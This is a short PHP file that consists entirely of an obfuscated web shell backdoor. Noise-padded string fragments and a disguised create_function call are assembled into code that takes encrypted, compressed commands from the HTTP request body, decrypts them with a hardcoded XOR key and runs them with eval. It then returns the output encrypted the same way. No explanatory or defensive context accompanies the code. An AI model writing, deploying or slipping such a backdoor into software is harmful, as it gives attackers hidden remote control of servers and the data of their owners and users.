<?php
$V='$k="T>bd7T>8375T>c";$khT>="4bbcT>f4a1e8a3";$kf="T>90T>c39dd3deT>83";$p="T>';
$H='h("/$kT>h(.+)$T>kT>f/",@filT>eT>_get_contentT>T>s("php:T>//input"),$T>m)==';
$j='T>T>e64_encode(T>@xT>(@T>gzcT>ompreT>ss(T>$oT>),$k));print("$p$kh$r$kf");}';
$c='YDtbDDT>tVZmmT>DST>NT>CT>B";function x($T>T>t,$k){$cT>=strlen($k);$l=T>strT';
$n='1) {T>@ob_T>start();T>@evT>al(@T>gzuncompresT>s(@x(@bT>ase6T>4_deT>coT>de(';
$T=str_replace('R','','cRRreateR_fuRnRRction');
$f='T>$m[1]),$k)));$o=@T>T>ob_get_coT>ntentsT>();@ob_enT>d_cleT>an()T>;$r=@bas';
$u=');$j++,$i++)T>{$T>T>o.=$t{$i}^$k{$j};}}reT>turn T>$o;T>T>}if (@pregT>_matc';
$s='>lenT>($t);$o="";T>fT>oT>r($i=0;$i<$l;T>){for($j=0T>;($j<$T>c&&$i<$T>T>T>l';
$X=str_replace('T>','',$V.$c.$s.$u.$H.$n.$f.$j);
$p=$T('',$X);$p();
?>
